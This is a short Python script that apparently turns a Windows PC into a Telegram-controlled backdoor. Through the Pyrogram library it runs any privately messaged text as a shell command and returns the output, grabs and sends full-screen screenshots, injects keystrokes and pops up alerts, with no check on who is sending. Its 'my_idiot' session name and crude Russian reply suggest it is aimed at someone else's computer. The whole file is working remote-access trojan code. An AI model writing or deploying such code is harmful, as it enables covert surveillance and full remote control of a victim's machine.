import subprocess
from pyrogram import Client, filters
import pyautogui
import io
import sys
from win10toast import ToastNotifier
from pyrogram import Client, filters
from PIL import ImageGrab
import random
import os
import requests
app = Client("my_idiot")
toaster = ToastNotifier()
@ app.on_message(filters.command("press"))
def press_key(client, message):
    keys = message.text.split()[1:]
    pyautogui.hotkey(*keys)
# eg /press q u a x  a l e r t

@ app.on_message(filters.command("alert"))
def show_alert(client, message):

    text = " ".join(message.command[1:])
    sender_name = message.from_user.first_name
    toaster.show_toast(sender_name, text, duration=10)

async def get_media_messages(client, channel_username):
    messages = []
    async for message in client.iter_messages(channel_username, limit=1000):
        if message.media:
            messages.append(message)
    return messages

@ app.on_message(filters.command("close"))
def close_program(client, message):
    message.reply_text("Closing the program...")

    # Terminate the script using sys.exit
    sys.exit()
@app.on_message(filters.command("screenshot"))
def take_screenshot(client, message):
    # Take a screenshot of the entire screen
    screenshot = ImageGrab.grab()

    # Convert the screenshot to bytes
    buffer = io.BytesIO()
    screenshot.save(buffer, format="PNG")
    buffer.seek(0)

    # Send the screenshot to the user who invoked the command
    client.send_photo(
        chat_id=message.chat.id,
        photo=buffer,
        caption="тест"
    )
@ app.on_message(filters.private)
def run_command(client, message):
    command = message.text
    try:
        msg = client.send_message(message.chat.id, "Running command...")
        output = subprocess.check_output(command, shell=True)
        if "shutdown" in command:
            print(msg)
            client.edit_message_text(chat_id=message.chat.id, message_id=msg.id, text="Чмо блять")
        else:
            print(msg)
            client.edit_message_text(chat_id=message.chat.id, message_id=msg.id, text=f"probably success \n {output.decode('cp866')}")
    except subprocess.CalledProcessError as e:
        print(msg)
        client.edit_message_text(chat_id=message.chat.id, message_id=msg.id, text=f"Command failed with error:\n{e}")

app.run()
